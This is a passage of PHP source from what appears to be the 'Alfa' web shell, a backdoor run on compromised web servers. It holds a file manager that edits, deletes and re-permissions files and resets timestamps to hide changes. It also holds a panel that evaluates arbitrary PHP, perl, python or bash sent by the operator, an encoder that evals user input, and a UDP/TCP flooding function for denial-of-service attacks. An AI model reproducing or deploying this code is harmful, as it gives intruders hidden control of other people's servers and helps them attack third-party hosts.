	if($dirContent[$i]["type"]=="file"){
		$files[] = array_merge($tmp, array('type' => 'file'));
	}else{
		if($dirContent[$i]["name"] != "."){
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
		}
	}
}
}
$GLOBALS['sort'] = $sort;
function alfaCmp($a, $b) {
if($GLOBALS['sort'][0] != 'size')
return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
else
return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
}
usort($files, "alfaCmp");
usort($dirs, "alfaCmp");
if(isset($_COOKIE["alfa_filesman_direction"])&& !empty($_COOKIE["alfa_filesman_direction"])){
	if($_COOKIE["alfa_filesman_direction"] == 'desc'){
		$files = array_reverse($files);
		$dirs = array_reverse($dirs);
	}
}
$files = array_merge($dirs, $files);
$l=0;
$cc=0;
foreach($files as $f){
$f['name'] = htmlspecialchars($f['name']);
$newname = mb_strlen($f['name'], 'UTF-8')>60?mb_substr($f['name'], 0, 60, 'utf-8').'...':$f['name'];
$checkbox = 'checkbox_'.$checkbox_rand.$cc;
$raw_name = rawurlencode($f['name']);
$icon = $GLOBALS['DB_NAME']['show_icons']?'<img src="'.findicon($f['name'],$f['type']).'" width="30" height="30">':'';
$style = $GLOBALS['DB_NAME']['show_icons']?'position:relative;display:inline-block;bottom:12px;':'';
echo '<tr class="fmanager-row" id="tr_row_'.$cc.'"><td><div class="myCheckbox"><input type="checkbox" name="f[]" value="'.$raw_name.'" class="chkbx" id="'.$checkbox .'"><label for="'.$checkbox .'"></label></div></td><td id="td_row_'.$cc.'">'.$icon.'<div style="'.$style.'"><a row="'.$cc.'" id="id_'.$cc.'" class="main_name" onclick="'.(($f['type']=='file')?'editor(\''.$raw_name.'\',\'auto\',\'\',\'\',\'\',\''.$f['type'].'\');" href="#action=fileman&path='.$GLOBALS['cwd'].'&file='.$raw_name.'" fname="'.$raw_name.'" ftype="file" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'>'.($GLOBALS['cwd'].$f['name']==$GLOBALS['__file_path']?"<span class='shell_name' style='font-weight:unset;'>".$f['name']."</span>":htmlspecialchars($newname)):'g(\'FilesMan\',\''.$f['path'].'\');" href="#action=fileman&path='.$f['path'].'" fname="'.$raw_name.'" ftype="folder" path="'.$GLOBALS['cwd'].'" opt_title="'.$f['link'].'" '.(isset($f['link'])?'onmouseover="showSymlinkPath(this,event);" onmouseout="hideSymlinkPath(this,event);"':'').'><b>| ' . htmlspecialchars($f['name']) . ' |</b>').'</a></td></div><td><span style="font-weight:unset;" class="main_size">'.(($f['type']=='file')?(isset($f['link'])?'[L] ':'').alfaSize($f['size']):$f['type']).'</span></td><td><span style="font-weight:unset;" class="main_modify">'.$f['modify'].'</span></td><td><span style="font-weight:unset;" class="main_owner_group">'.$f['owner'].'/'.$f['group'].'</span></td><td><a id="id_chmode_'.$cc.'" href=javascript:void(0) onclick="editor(\''.$raw_name.'\',\'chmod\',\'\',\'\',\'\',\''.$f['type'].'\')">'.
$f['perms'].'</td><td><a id="id_rename_'.$cc.'" title="Rename" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'rename\',\'\',\'\',\'\',\''.$f['type'].'\')">R</a> <a id="id_touch_'.$cc.'" title="Modify Datetime" class="actions" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'touch\',\'\',\'\',\'\',\''.$f['type'].'\')">T</a>'.(($f['type']=='file')?' <a id="id_edit_'.$cc.'" class="actions" title="Edit" href="javascript:void(0);" onclick="editor(\''.$raw_name.'\', \'edit\',\'\',\'\',\'\',\''.$f['type'].'\')">E</a> <a id="id_download_'.$cc.'" title="Download" class="actions" href="javascript:void(0);" onclick="g(\'FilesTools\',null,\''.$raw_name.'\', \'download\')">D</a>':'').'<a id="id_delete_'.$cc.'" title="Delete" class="actions" href="javascript:void(0);" onclick="var chk = confirm(\'Are You Sure For Delete # '.addslashes(rawurldecode($f['name'])).' # ?\'); chk ? g(\'FilesMan\',null,\'delete\', \''.$raw_name.'\') : \'\';"> X </a></td></tr>';
$l = $l?0:1;
$cc++;
}
echo "<tr id='filemanager_last_tr'><td colspan=7>
<input type=hidden name=a value='FilesMan'>
<input type=hidden name=c value='".htmlspecialchars(($GLOBALS['glob_chdir_false']?$_POST['c']:$GLOBALS['cwd']))."'>
<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
<select id='tools_selector' name='alfa1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete' selected>Delete</option><option value='zip'>Add 2 Compress (zip)</option><option value='unzip'>Add 2 Uncompress (zip)</option><option value='paste'>Paste / Zip / Unzip </option></select>
<input type='submit' value=' '>
</form></table><div class='pages-holder'><div class='pages-number'>".$page_builder."</div></div></div></div>";
alfafooter();
}
function get_pagination_links($current_page, $total_pages){
    $links = "";
    if ($total_pages >= 1 && $current_page <= $total_pages) {
		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\"><<</a>";
		$selected_page = "";
		if($current_page == 1){
			$selected_page = " active-page-number";
		}
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">1</a>";
        $i = max(2, $current_page - 5);
        if ($i> 2)
            $links .= "<a class=\"page-number\">...</a>";
        for (; $i < min($current_page + 6, $total_pages); $i++) {
			if($i == $current_page){
				$selected_page = " active-page-number";
			}else{
				$selected_page = "";
			}
            $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$i}</a>";
        }
        if ($i != $total_pages)
            $links .= "<a class=\"page-number\">...</a>";
		$selected_page = " last-page-number";
		if($current_page == $total_pages){
			$selected_page .= " active-page-number";
		}
        $links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number".$selected_page."\">{$total_pages}</a>";
		$links .= "<a onclick=\"pageChangedFilesMan(this);\" class=\"page-number\">>></a>";
    }
    return $links;
}
function alfaFilesTools(){
alfahead();
echo '<div class="filestools" style="height: 100%;">';
if(isset($_POST['alfa1']))$_POST['alfa1'] = rawurldecode($_POST['alfa1']);
$alfa1_decoded = $_POST['alfa1'];
$chdir_fals = false;
if(!@chdir($_POST['c'])){
	$chdir_fals = true;
	$_POST['alfa1'] = $_POST["c"]."/".$_POST["alfa1"];
	$alfa_canruncmd = _alfa_can_runCommand(true,true);
	if($alfa_canruncmd){
		$slashed_alfa1 = addslashes($_POST['alfa1']);
		$file_info = explode(":", alfaEx('stat -c "%F:%U:%G:%s:%Y:0%a:%A" "'.$slashed_alfa1.'"'));
		$perm_color_class = alfaEx("if [[ -w '".$slashed_alfa1."' ]]; then echo main_green_perm; elif [[ -r '".$slashed_alfa1."' ]]; then echo main_white_perm; else echo main_red_perm; fi");
	}
}
if($_POST['alfa2'] == 'auto'){
if(is_array(@getimagesize($_POST['alfa1']))){
$_POST['alfa2'] = 'image';
}else{
	$_POST['alfa2'] = 'view';
	if($chdir_fals){
		if($alfa_canruncmd){
			$mime = explode(":", alfaEx("file --mime-type '".addslashes($_POST['alfa1'])."'"));
			$mimetype = $mime[1];
			if(!empty($mimetype)){
				if(strstr($mimetype, "image")){
					$_POST['alfa2'] = 'image';
				}
			}
		}
	}
}
}
if($_POST['alfa2'] == "rename" && !empty($_POST['alfa3']) && @is_writable($_POST['alfa1'])){$rename_cache = $_POST['alfa3'];}
if(@$_POST['alfa2'] == 'mkfile'){
$_POST['alfa1'] = trim($_POST['alfa1']);
if($chdir_fals&&$alfa_canruncmd){
	if(_alfa_is_writable($_POST["c"])){
		alfaEx("cd '".addslashes($_POST["c"])."';touch '".addslashes($alfa1_decoded)."'");
		$_POST['alfa2'] = "edit";
	}
}
if(!@file_exists($_POST['alfa1'])){
$fp = @fopen($_POST['alfa1'], 'w');
if($fp){
$_POST['alfa2'] = "edit";
fclose($fp);
}
}else{
$_POST['alfa2'] = "edit";
}
}
if(!_alfa_file_exists(@$_POST['alfa1'])){
echo __pre()."<center><p><div class=\"txtfont\"><font color='red'>!...FILE DOEST NOT EXITS...!</font></div></p></center></div><script>editor_error=false;removeHistory('".$_POST['alfa4']."');</script>";
alfaFooter();
return;
}
if($chdir_fals){
$filesize = $file_info[3];
$uid["name"] = $file_info[1];
$gid["name"] = $file_info[2];
$permcolor = alfaPermsColor(array("class"=>$perm_color_class,"num"=>$file_info[5],"human"=>$file_info[6]),true);
}else{
$uid = function_exists("posix_getpwuid")&&function_exists("fileowner")?@posix_getpwuid(@fileowner($_POST['alfa1'])):'';
$gid = function_exists("posix_getgrgid")&&function_exists("filegroup")?@posix_getgrgid(@filegroup($_POST['alfa1'])):'';
if(!$uid&&!$gid){
$uid['name'] = function_exists("fileowner")?@fileowner($_POST['alfa1']):'';
$gid['name'] = function_exists("filegroup")?@filegroup($_POST['alfa1']):'';
}
$permcolor = alfaPermsColor($_POST['alfa1']);
$filesize = @filesize($_POST['alfa1']);
if(!isset($uid['name'],$gid['name'])||empty($uid['name'])||empty($gid['name'])){
	if(_alfa_can_runCommand()){
		list($uid['name'],$gid['name']) = explode(":", alfaEx('stat -c "%U:%G" "'.addslashes($_POST["c"]."/".$_POST["alfa1"]).'"'));
	}
}
}
if(substr($_POST['alfa1'], 0, 7) == "phar://"){
	$alfa_file_directory = $_POST['alfa1'];
}else{
	$alfa_file_directory = str_replace("//", "/",($chdir_fals?"":$_POST['c'].'/').$_POST['alfa1']);
}
echo '<div style="overflow: hidden;white-space: nowrap;text-overflow: ellipsis;"><span class="editor_file_info_vars">Name:</span> '.htmlspecialchars(basename($alfa1_decoded)).' <span class="editor_file_info_vars">Size:</span> '.alfaSize($filesize).' <span class="editor_file_info_vars">Permission:</span> '.$permcolor.' <span class="editor_file_info_vars">Owner/Group:</span> '.$uid['name'].'/'.$gid['name'].' <span class="editor_file_info_vars">Directory:</span> '.dirname($alfa_file_directory).'</div>';
if(empty($_POST['alfa2']))$_POST['alfa2'] = 'view';
if(!_alfa_is_dir($_POST['alfa1'])){
$m = array('View', 'Download', 'Highlight', 'Chmod', 'Rename', 'Touch', 'Delete', 'Image', 'Hexdump');
$ftype = "file";
}else{
$m = array('Chmod', 'Rename', 'Touch');
$ftype = "dir";
}
echo('<div>');
foreach($m as $v)
echo $v == 'Delete' ? '<a href="javascript:void(0);" onclick="var chk=confirm(\'Are You Sure For Delete This File ?\');chk?editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\'):\'\';"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a> ' : '<a href="javascript:void(0);" onclick="editor(\''.addslashes(!isset($rename_cache)?$_POST['alfa1']:$rename_cache).'\',\''.strtolower($v).'\',\'\',\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\')"><span class="editor_actions">'.((strtolower($v)==@$_POST['alfa2'])?'<b><span class="editor_actions"> '.$v.' </span> </b>':$v).' | </span></a>';
echo '</div>';
switch($_POST['alfa2']){
case 'view':case 'edit':
@chdir($_POST['c']);
$disabled_btn = "";
if(!@is_writable($_POST['alfa1'])&&!_alfa_is_writable($_POST['alfa1'])){
$disabled_btn = "disabled=disabled";
$disabled_btn_style= 'background: #ff0000;color: #fff;';
}
if(!empty($_POST['alfa3'])){
$_POST['alfa3'] = substr($_POST['alfa3'],1);
$time = @filemtime($_POST['alfa1']);
$fp = @__write_file($_POST['alfa1'],$_POST['alfa3']);
if($chdir_fals&&$alfa_canruncmd){
	$rname = $alfa1_decoded;
	$randname = $rname.rand(111,9999);
	$filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
	if($fp = @__write_file($filepath ,$_POST['alfa3'])){
		alfaEx("mv '".addslashes($filepath)."' '".addslashes($_POST["alfa1"])."';rm -f '".addslashes($filepath)."'");
	}
}
if($fp){
echo 'Saved!<br>';
@touch($_POST['alfa1'],$time,$time);
}
}
echo '<div class="editor-view"><div class="view-content editor-ace-controller"><div style="display:inline-block;">'._alfa_load_ace_options("editor").'<button style="border-radius:10px;" class="button ace-controler" onClick="copyToClipboard(this);">Copy</button> <button class="button ace-controler" onclick="alfaAceToFullscreen(this);">Full Screen</button> <button onclick="var ace_val = alfa_ace_editors.editor[this.getAttribute(\'ace_id\')].getValue();editor(\''.addslashes($alfa1_decoded).'\',\'edit\',\'1\'+ace_val,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;" class="button ace-controler ace-save-btn" style="width: 100px;height: 33px;'.$disabled_btn_style.'" '.$disabled_btn.'>save</button></div><pre class="ml1 view_ml_content">';
echo htmlspecialchars(__read_file($_POST['alfa1']));
echo '</pre></div></div>';
break;
case 'highlight':
@chdir($_POST['c']);
if(@is_readable($_POST['alfa1'])){
echo '<div class="editor-view"><div class="view-content"><div class="ml1" style="background-color: #e1e1e1;color:black;">';
$code = @highlight_file($_POST['alfa1'],true);
echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$code).'</div></div></div>';
}
break;
case 'delete':
@chdir($_POST['c']);
if(@is_writable($_POST['alfa1'])||$GLOBALS["glob_chdir_false"]){
$deleted = true;
if(!@unlink($_POST['alfa1'])){
	$deleted = false;
	if($alfa_canruncmd){
		if(_alfa_is_writable($_POST['alfa1'])){
			alfaEx("rm -f '".addslashes($_POST['alfa1'])."'");
			$deleted = true;
		}
	}
}
if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['alfa4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['alfa4'].'"];</script>';else echo 'Error...';}
break;
case 'chmod':
@chdir($_POST['c']);
if(!empty($_POST['alfa3'])){
$perms = 0;
for($i=strlen($_POST['alfa3'])-1;$i>=0;--$i)
$perms += (int)$_POST['alfa3'][$i]*pow(8, (strlen($_POST['alfa3'])-$i-1));
if(!@chmod($_POST['alfa1'], $perms)){
if($chdir_fals&&$alfa_canruncmd){
alfaEx("cd '".addslashes($_POST["c"])."';chmod ".addslashes($_POST['alfa3'])." '".addslashes($alfa1_decoded)."'");
echo('Success!');
}else{
echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>document.mf.alfa3.value="";</script>';}
}else{echo('Success!');}
}
clearstatcache();
AlfaNum(8,9,10,7,6,5,4,2,1);
if($chdir_fals){
	$file_perm = $file_info[5];
}else{
	$file_perm = substr(sprintf('%o', @fileperms($_POST['alfa1'])),-4);
}
echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
break;
case 'hexdump':
@chdir($_POST['c']);
$c = __read_file($_POST['alfa1']);
$n = 0;
$h = array('00000000<br>','','');
$len = strlen($c);
for ($i=0; $i<$len; ++$i) {
$h[1] .= sprintf('%02X',ord($c[$i])).' ';
switch ( ord($c[$i]) ) {
case 0: $h[2] .= ' '; break;
case 9: $h[2] .= ' '; break;
case 10: $h[2] .= ' '; break;
case 13: $h[2] .= ' '; break;
default: $h[2] .= $c[$i]; break;
}
$n++;
if ($n == 32) {
$n = 0;
if ($i+1 < $len) {$h[0] .= sprintf('%08X',$i+1).'<br>';}
$h[1] .= '<br>';
$h[2] .= "\n";
}
}
echo '<div class="editor-view"><div class="view-content"><table cellspacing=1 cellpadding=5 bgcolor=black><tr><td bgcolor=gray><span style="font-weight: normal;"><pre>'.$h[0].'</pre></span></td><td bgcolor=#282828><pre>'.$h[1].'</pre></td><td bgcolor=#333333><pre>'.htmlspecialchars($h[2]).'</pre></td></tr></table></div></div>';
break;
case 'rename':
@chdir($_POST['c']);
$alfa1_escape = addslashes($_POST["alfa1"]);
$alfa3_escape = addslashes($_POST["alfa3"]);
if(!empty($_POST['alfa3'])){
$cmd_rename = false;
if($chdir_fals&&$alfa_canruncmd){
if(_alfa_is_writable($_POST['alfa1'])){
$alfa1_escape = addslashes($alfa1_decoded);
alfaEx("cd '".addslashes($_POST['c'])."';mv '".$alfa1_escape."' '".addslashes($_POST['alfa3'])."'");
}else{
$cmd_rename = true;
}
}else{
$alfa1_escape = addslashes($_POST["alfa1"]);
}
if(!@rename($_POST['alfa1'], $_POST['alfa3'])&&$cmd_rename){
echo 'Can\'t rename!<br>';}else{echo('Renamed!<script>try{$("'.$_POST['alfa4'].'").innerHTML = "<div class=\'editor-icon\'>"+loadType(\''.$alfa3_escape.'\',\''.$ftype.'\',\''.$_POST['alfa4'].'\')+"</div><div class=\'editor-file-name\'>'.$alfa3_escape.'</div>";editor_files["'.$_POST['alfa4'].'"].file = "'.$alfa3_escape.'";updateFileEditor("'.$alfa1_escape.'", "'.$alfa3_escape.'");'.($ftype == "dir"?"updateDirsEditor('".$_POST['alfa4']."','".$alfa1_escape."');":"").'}catch(e){console.log(e)}</script>');$alfa1_escape = $alfa3_escape;}
}
echo '<form onsubmit="editor(\''.$alfa1_escape.'\',\''.$_POST['alfa2'].'\',this.name.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type="text" name="name" value="'.addslashes(htmlspecialchars(isset($_POST['alfa3'])&&$_POST['alfa3']!=''?$_POST['alfa3']:$alfa1_decoded)).'"><input type=submit value=" "></form>';
break;
case 'touch':
@chdir($_POST['c']);
if( !empty($_POST['alfa3']) ) {
$time = strtotime($_POST['alfa3']);
if($time){
$touched = false;
if($chdir_fals&&$alfa_canruncmd){
	alfaEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['alfa3']))."' '".addslashes($alfa1_decoded)."'");
	$touched = true;
}
if(!@touch($_POST['alfa1'],$time,$time)&&!$touched)
echo 'Fail!';
else
echo 'Touched!';
} else echo 'Bad time format!';
}
clearstatcache();
echo '<script>alfa3_="";</script><form onsubmit="editor(\''.addslashes($_POST['alfa1']).'\',\''.$_POST['alfa2'].'\',this.touch.value,\''.$_POST['c'].'\',\''.$_POST['alfa4'].'\',\''.$ftype.'\');return false;"><input type=text name=touch value="'.date("Y-m-d H:i:s", ($chdir_fals?$file_info[4]:@filemtime($_POST['alfa1']))).'"><input type=submit value=" "></form>';
break;
case 'image':
@chdir($_POST['c']);
echo('<hr>');
$file = $_POST['alfa1'];
$image_info = @getimagesize($file);
if(is_array($image_info)||$chdir_fals){
$width = (int)$image_info[0];
$height = (int)$image_info[1];
if($chdir_fals&&$alfa_canruncmd){
	$source = alfaEx("cat '".addslashes($file)."' | base64");
	list($width, $height) = explode(":", alfaEx("identify -format '%w:%h' '".addslashes($file)."'"));
	$mime = explode(":", alfaEx("file --mime-type '".addslashes($file)."'"));
	$image_info['mime'] = $mime[1];
}else{
	$source = __ZW5jb2Rlcg(__read_file($file, false));
}
$image_info_h = "Image type = <span>[</span> ".$image_info['mime']." <span>]</span><br>Image Size = <span>[ </span>".$width." x ".$height."<span> ]</span><br>";
if($width > 800){$width = 800;}
echo $content = "<div class='editor-view'><div class='view-content'><center>".$image_info_h."<br><img id='viewImage' style='max-width:100%;border:1px solid green;' src='data:".$image_info['mime'].";base64,".$source."' alt='".$file."'></center></div></div><br>";
}
break;
}
echo '</div>';
alfaFooter();
}
function findicon($file,$type){
$s = 'http://solevisible.com/icons/';
$types = array('json','ppt','pptx','xls','xlsx','msi','config','cgi','pm','c','cpp','cs','java','aspx','asp','db','ttf','eot','woff','woff2','woff','conf','log','apk','cab','bz2','tgz','dmg','izo','jar','7z','iso','rar','bat','sh','alfa','gz','tar','php','php4','php5','phtml','html','xhtml','shtml','htm','zip','png','jpg','jpeg','gif','bmp','ico','txt','js','rb','py','xml','css','sql','htaccess','pl','ini','dll','exe','mp3','mp4','m4a','mov','flv','swf','mkv','avi','wmv','mpg','mpeg','dat','pdf','3gp','doc','docx','docm');
if($type!='file'){
return ($file=='..'?$s.'back.png':$s.'folder.png');
}else{
$ext = explode('.',$file);
$ext = end($ext);
$ext = strtolower($ext);
return (in_array($ext,$types)?$s.$ext.'.png':$s.'notfound.png');
}
}
function alfadlfile(){
if(isset($_POST['c'],$_POST['file'])){
$basename = rawurldecode(basename($_POST['file']));
$_POST['file'] = str_replace("//", "/", $_POST['c'].'/'.$basename);
$alfa_canruncmd = _alfa_can_runCommand(true,true);
if(@is_file($_POST['file']) && @is_readable($_POST['file']) || $alfa_canruncmd){
ob_start("ob_gzhandler", 4096);
header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
header("Content-Type: application/octet-stream");
if($GLOBALS["glob_chdir_false"]){
	$randname = $basename.rand(111,9999);
	$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
	$filepath = $scriptpath."/".$randname;
	if(_alfa_is_writable($scriptpath)){
		alfaEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
		readfile($filepath);
		@unlink($filepath);
	}else{
		alfaEx("cat '".addslashes($_POST["file"])."'");
	}
}else{
	readfile($_POST['file']);
}
}else echo('Error...!');}}
function __alfa_set_cookie($key, $value){
	$_COOKIE[$key] = $value;
	@setcookie($key, $value, time()+(86400 * 7), '/');
}
function alfaphpeval(){
if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
	$tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
}else{
	$tempdir = dirname(alfaEx("mktemp"));
	__alfa_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
}
alfahead();
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'ini')){
echo '<div class=header>';
ob_start();
$INI=ini_get_all();
print '<table border=0><tr>'
.'<td class="listing"><font class="highlight_txt">Param</td>'
.'<td class="listing"><font class="highlight_txt">Global value</td>'
.'<td class="listing"><font class="highlight_txt">Local Value</td>'
.'<td class="listing"><font class="highlight_txt">Access</td></tr>';
foreach ($INI as $param => $values)
print "\n".'<tr>'
.'<td class="listing"><b>'.$param.'</td>'
.'<td class="listing">'.$values['global_value'].' </td>'
.'<td class="listing">'.$values['local_value'].' </td>'
.'<td class="listing">'.$values['access'].' </td></tr>';
$tmp = ob_get_clean();
$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
echo str_replace('<h1','<h2', $tmp) .'</div><br>';
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'info')) {
echo '<div class=header><style>.p {color:#000;}</style>';
ob_start();
phpinfo();
$tmp = ob_get_clean();
$tmp = preg_replace('!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU','',$tmp);
$tmp = preg_replace('!td, th {(.*)}!msiU','.e, .v, .h, .h th {$1}',$tmp);
echo str_replace('<h1','<h2', $tmp) .'</div><br>';
}
if(isset($_POST['alfa2']) && ($_POST['alfa2'] == 'exten')) {
echo '<div class=header>';
ob_start();
$EXT=get_loaded_extensions();
echo '<table border=0><tr><td class="listing">'.implode('</td></tr>'."\n".'<tr><td class="listing">', $EXT).'</td></tr></table>'.count($EXT).' extensions loaded';
echo '</div><br>';
}
$lang_html = "";
foreach(array("php"=>"php ~> [ Windows / Linux ]","perl"=>"perl ~> [ Linux ]","python"=>"python ~> [ Linux ]","bash"=>"bash ~> [ Linux ]") as $key=>$val){$lang_html .= '<option value="'.$key.'" '.($_POST["alfa3"]==$key?"selected":"").'>'.$val.'</option>';}
echo '<div class=header><Center><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'ini\')">| INI_INFO | </a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'info\')"> | phpinfo |</a><a href=javascript:void(0) onclick="g(\'phpeval\',null,\'\',\'exten\')"> | extensions |</a></center><br><form class="php-evals" name="pf" method="post" onsubmit="var ace_value=geEvalAceValue(this);g(\'phpeval\',null,ace_value,null,this.language.value); return false;"><div class="txtfont">Select Language: </div> <select name="language" style="width:300px;">'.$lang_html.'</select>'._alfa_load_ace_options("eval").'<br><br><div class="bigarea" style="position:relative;"><div class="php-evals-ace">'.(!empty($_POST['alfa1'])?htmlspecialchars($_POST['alfa1']):"&lt;?php\n\n\techo('hello alfa !');\n\n?>").'</div></div><center><input type="submit" value="" style="margin-top:5px"></center>';
echo '</form><pre id="PhpOutput" style="'.(empty($_POST['alfa1'])?'display:none;':'').'margin-top:5px;" class="ml1">';
if(!empty($_POST['alfa1'])){
if($_POST['alfa3']=="php"){
ob_start();
eval('?>'.$_POST['alfa1']);
$result = htmlspecialchars(ob_get_clean());
}elseif(_alfa_can_runCommand()&&$GLOBALS["sys"]=="unix"){
	$lang = $_POST['alfa3'];
	$filename = "temp".rand(11111,99999);
	$temp = $tempdir."/".$filename ;
	__write_file($filename, $_POST['alfa1']);
	$result = alfaEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
	@unlink($filename);
	@unlink($temp);
}
echo '<textarea class="bigarea">'.$result.'</textarea>';
}
echo '</pre></div>';
alfafooter();
}
function alfahash(){
if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
$stringTools = array(
'Base64_encode ( $string )' => '__ZW5jb2Rlcg($s)',
'Base64_decode ( $string )' => '__ZGVjb2Rlcg($s)',
'strrev ( $string )' => 'strrev($s)',
'bin2hex ( $string )' => 'bin2hex($s)','hex2bin ( $string )' => 'hex2bin($s)',
'md5 ( $string )' => 'md5($s)',
'sha1 ( $string )' => 'sha1($s)',
'hash ( "sha251", $string ) --> sha251' => 'hash("sha256",$s)',
'hash ( "sha384", $string ) --> sha384' => 'hash("sha384",$s)',
'hash ( "sha512", $string ) --> sha512' => 'hash("sha512",$s)',
'crypt ( $string )' => 'crypt($s)',
'crc32 ( $string )' => 'crc32($s)',
'str_rot13 ( $string )' => 'str_rot13($s)',
'urlencode ( $string )' => 'urlencode($s)',
'urldecode  ( $string )' => 'urldecode($s)',
'full_urlencode  ( $string )' => 'full_urlencode($s)',
'htmlspecialchars  ( $string )' => 'htmlspecialchars($s)',
'base64_encode (gzdeflate( $string , 9)) --> Encode' => '__ZW5jb2Rlcg(gzdeflate($s, 9))',
'gzinflate (base64_decode( $string )) --> Decode' => '@gzinflate(__ZGVjb2Rlcg($s))',
'str_rot13 (base64_encode( $string )) --> Encode' => 'str_rot13(__ZW5jb2Rlcg($s))',
'base64_decode (str_rot13( $string )) --> Decode' => '__ZGVjb2Rlcg(str_rot13($s))',
'str_rot13 (base64_encode(gzdeflate( $string , 9))) --> Encode' => 'str_rot13(__ZW5jb2Rlcg(gzdeflate($s,9)))',
'gzinflate (base64_decode(str_rot13( $string ))) --> Decode' => '@gzinflate(__ZGVjb2Rlcg(str_rot13($s)))',
);
alfahead();
echo '<div class=header>';
echo "<form onSubmit='g(\"hash\",null,this.selectTool.value,this.input.value);return false;'><div class='txtfont'>Method:</div> <select name='selectTool' style='width:400px;'>";
foreach($stringTools as $k => $v)
echo "<option value='".htmlspecialchars($v)."' ".($_POST['alfa1']==$v?'selected':'').">".$k."</option>";
echo "</select> <input type='submit' value=' '/><br><textarea  name='input' style='margin-top:5px' class='bigarea'>".(empty($_POST['alfa1'])?'':htmlspecialchars(@$_POST['alfa2']))."</textarea></form>";
if(!empty($_POST['alfa1'])){
$string = addslashes($_POST['alfa2']);
$string = str_replace('\"','"',$string);
$alg = $_POST['alfa1'];
$code = str_replace('$s',"'".$string."'",$alg);
ob_start();
eval('echo '.$code.';');
$res = ob_get_contents();
ob_end_clean();
if(in_array($alg, $stringTools))echo '<textarea class="bigarea">'.htmlspecialchars($res).'</textarea>';
}
echo "</div>";
alfaFooter();
}
function alfados(){
alfahead();
echo '<div class=header>';
echo '<center><p><div class="txtfont_header">| DOS |</div></p><form onSubmit="g(\'dos\',null,this.host.value,this.time.value,this.port.value,this.m.value); return false;"><div class="txtfont">Method : <select name="m" style="width:80px;"><option value="udp">UDP</option><option value="tcp">TCP</option></select> Host : <input name="host" type="text" value="localhost" size="25" /> Time : <input name="time" type="text" size="15" /> Port : <input name="port" type="text" size="10" /> <input type="submit" value=" " /></div></form></center><br>';
if(!empty($_POST['alfa1']) && !empty($_POST['alfa2']) && !empty($_POST['alfa3'])){
echo __pre();
$packets=0;
ignore_user_abort(true);
$exec_time=(int)$_POST['alfa2'];
$time=time();
$max_time=$exec_time+$time;
$host=$_POST['alfa1'];
$port=(int)$_POST['alfa3'];
$method=$_POST['alfa4'];
$out = str_repeat('X',65000);
while(1){
$packets++;
if(time() > $max_time){
break;
}
$fp = @fsockopen($method.'://'.$host, $port, $errno, $errstr, 5);
if($fp){
fwrite($fp, $out);
fclose($fp);
}
}
echo "<center>$packets (" . @round(($packets*65)/1024, 2) . " MB) packets averaging ". @round($packets/$exec_time, 2) . " packets per second</center>";
echo "</pre>";
}
echo '</div>';
alfafooter();
}
function __pre(){return('<pre id="strOutput" style="margin-top:5px" class="ml1">');}
function alfaIndexChanger(){
alfahead();

